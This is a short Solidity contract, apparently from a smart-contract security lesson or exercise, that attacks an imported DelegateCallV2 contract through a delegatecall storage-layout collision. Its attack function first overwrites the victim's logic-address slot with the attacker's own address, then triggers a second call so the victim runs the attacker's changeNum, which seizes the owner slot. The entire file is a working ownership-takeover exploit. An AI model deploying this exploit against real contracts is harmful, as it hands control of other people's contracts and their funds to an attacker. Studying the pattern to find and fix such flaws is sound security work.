// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./DelegateCallV2.sol";

contract AttackV2 {
    address public logic;
    address public owner;
    uint public num;

    DelegateCallV2 public delegatecall;

    constructor(DelegateCallV2 _delegateCallAddress){
        delegatecall = DelegateCallV2(_delegateCallAddress);
    }

    function attack() public{
        delegatecall.changeNum(uint(uint160((address(this)))));
        delegatecall.changeNum(1);
    }

    function changeNum(uint _num) public{
        owner = msg.sender;
    }
}
